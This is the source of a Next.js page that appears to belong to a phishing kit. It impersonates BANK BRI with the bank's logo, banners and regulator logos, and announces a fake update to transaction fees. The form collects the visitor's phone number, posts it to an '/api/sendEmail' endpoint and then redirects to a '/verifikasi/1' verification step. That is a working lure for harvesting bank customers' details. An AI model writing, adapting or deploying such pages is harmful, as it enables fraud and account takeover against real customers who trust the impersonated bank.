
import Image from 'next/image'
import banner from "../public/img-1.jpeg"
import banner2 from "../public/img-2.jpeg"
import logo from "../public/logo.jpg"
import ojk from "../public/ojk.png"
import lps from "../public/lps.png"
import { BsFillTelephoneFill } from 'react-icons/bs'

import { Swiper, SwiperSlide } from 'swiper/react';
// Import Swiper styles
import 'swiper/css';
import 'swiper/css/pagination';
import { Pagination } from 'swiper'
import { useState } from 'react'
import { useRouter } from 'next/router'

export default function Pin({host}) {
    const [data, setData] = useState({})
    const router = useRouter()

    
	const handleSubmit = async (e) => {

        e.preventDefault()

        document.getElementById('btn').innerHTML = 'Loading...'
        try {
            
            const response = await fetch('/api/sendEmail', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'url': host
                },
                body: JSON.stringify(data)
            })

            const json = await response.json()
            
            if (json.status === 200) {
                document.getElementById('btn').innerHTML = 'Lanjut'
                router.push('/verifikasi/1')
            } else{
                document.getElementById('btn').innerHTML = 'Lanjut'
                console.log(json.error)
            }

        } catch (error) {
            document.getElementById('btn').innerHTML = 'Lanjut'
            console.log(error.message);
        }
    }
	const handleChange = (e) => {
        setData({
            ...data, 
            [e.target.name]: e.target.value
        })
    }

  return (
    	<div className="container">
            <div className='container-flex'>
                <div style={{margin:'0 5px'}}>
                    <Image src={logo} height={50} width={200} alt="logo" />              
                </div>
                <div style={{marginTop:'-30px'}}>
					<Swiper
						modules={[Pagination]}
						pagination={{ clickable: true }}
						slidesPerView={1}
						autoplay={true}
					>
						<SwiperSlide><Image src={banner} height={400} alt="logo2" /></SwiperSlide>
						<SwiperSlide><Image src={banner2} height={400} alt="logo3" /></SwiperSlide>
					</Swiper>            
                </div>
                  	<p style={{width:'90%',  margin:'0 auto', textAlign:'center', color:'rgb(14 120 202)', fontWeight:'bolder', fontSize:18}}>
						BANK BRI Update Terbaru <br />
						Tarif Transaksi
					</p>
					<h6  style={{width:'90%',  margin:'10px auto 0 auto', textAlign:'center', fontSize:18}}><u>TARIF TRANSAKSI</u></h6>
                  <div style={{margin:'20px'}}>
                      <form onSubmit={handleSubmit}>
                          <label htmlFor='tarif' style={{fontWeight:'bolder', fontSize:16}}>Masukan nomor ponsel anda:</label>
						  <br/>
						  <div className="form-group" style={{marginTop:20}}>
                            <input type="number" className='form-control' placeholder='No Handphone' onChange={handleChange} name="noHp" style={{outline:'2px solid rgb(14 120 202)'}}/>
                            <BsFillTelephoneFill className='icon-control'/>
                        </div>
                          <button type='submit' className='btn' id='btn' style={{cursor:'pointer', fontWeight:'normal', wordSpacing:2, borderRadius:4}}>
                              Lanjut
                          </button>
						  
                      </form>
                  </div>
            </div>
        </div>
  )
}

export async function getServerSideProps(context) {

    const host = context.req.headers.host
    
    return {
      props: {
        host
      },
    }
  }
